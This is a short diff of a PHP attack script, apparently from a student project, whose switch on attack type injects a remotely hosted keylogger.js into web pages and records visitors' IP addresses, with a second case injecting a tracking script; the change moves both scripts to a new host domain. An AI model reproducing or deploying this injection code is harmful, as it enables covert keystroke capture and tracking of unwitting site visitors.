@@ -6,7 +6,7 @@ $privateKey = $_SESSION['privateKey'];
 $textToInsert="";
 switch($typeOfAttack){
     case "Key":
-          $keyloggerscript = "http://individualproject.esy.es/js/keylogger.js";
+          $keyloggerscript = "http://stme.esy.es/js/keylogger.js";
           $textToInsert="<script type='text/javascript' src='$keyloggerscript'</script>";
           //GETTING IP AND ADDING IT TO DATA.TXT ON SERVER
           $ip = getenv('HTTP_CLIENT_IP')?:
@@ -39,7 +39,7 @@ switch($typeOfAttack){
           break;
 
     case "Tracking":
-          $TrackingScript = "http://individualproject.esy.es/js/tracking.js";
+          $TrackingScript = "http://stme.esy.es/js/tracking.js";
           $textToInsert="<script type='text/javascript' src='$TrackingScript'></script>";
           runScript($textToInsert);
           break;
